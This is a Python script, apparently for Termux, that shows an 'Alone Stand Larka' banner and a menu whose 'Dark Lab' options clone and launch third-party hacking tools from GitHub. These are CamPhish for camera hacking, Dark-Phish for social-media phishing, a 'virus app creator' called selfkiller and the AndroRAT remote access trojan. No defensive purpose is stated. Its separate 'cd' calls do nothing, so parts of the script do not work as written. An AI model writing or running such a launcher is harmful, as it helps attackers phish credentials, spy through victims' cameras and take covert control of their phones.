import os
import time
import pyfiglet
import time
import os

# Set text color to green
os.system("tput setaf 6")

# Set text style to live type
figlet_text = pyfiglet.figlet_format("Alone Stand Larka", font="slant")
for char in figlet_text:
    print(char, end="", flush=True)
    time.sleep(0.005)
print()
# Set text color to green
os.system("tput setaf 2")

# Print the intro text word by word
intro_text = "This Tool is created by AloneStandLarka. Only Use for 🤣🤣😊😊 Smj jao."
for word in intro_text.split():
    print(word, end=" ", flush=True)
    time.sleep(0.8)
print()

# Show the main menu
print("Select an option:")
print("1. Install")
print("2. Dark Lab")

while True:
    choice = input("Enter your choice: ")
    if choice == "1":
        # Install Termux basic pkgs
        os.system("apt update && apt upgrade -y")
        os.system("pkg install git")
        os.system("pkg install python")
        os.system("pkg install python2")
        os.system("apt install curl")
        os.system("pkg install curl")
        break
    elif choice == "2":
        # Show the Dark Lab menu
        print("Select an option:")
        print("1. Camera Hacking")
        print("2. Social Hacking")
        print("3. Virus App Creator")
        print("4. Rat Create")
        print("5. Back to Main Menu")

        while True:
            dark_lab_choice = input("Enter your choice: ")
            if dark_lab_choice == "1":
                # Camera Hacking
                os.system("git clone https://github.com/techchipnet/CamPhish")
                os.system("cd CamPhish")
                os.system("bash camphish.sh")
                break
            elif dark_lab_choice == "2":
                # Social Hacking
                os.system("apt install python3 curl php git openssh nodejs npm -y")
                os.system("pip3 install requests wget pyshorteners")
                os.system("git clone https://github.com/Cyber-Anonymous/Dark-Phish.git")
                os.system("cd Dark-Phish")
                os.system("python3 dark-phish.py")
                break
            elif dark_lab_choice == "3":
                # Virus App Creator
                os.system("git clone https://github.com/GH05T-HUNTER5/selfkiller")
                os.system("cd selfkiller")
                os.system("chmod +x selfkiller")
                os.system("python3 install.py")
                os.system("selfkiller")
                break
            elif dark_lab_choice == "4":
                # Rat Create
                os.system("git clone https://github.com/karma9874/AndroRAT.git")
                os.system("cd AndroRAT")
                os.system("pip install -r requirements.txt")
                os.system("python androRAT.py")
                break
            elif dark_lab_choice == "5":
                # Back to Main Menu
                break
            else:
                print("Invalid choice. Please try again.")
    else:
        print("Invalid choice. Please try again.")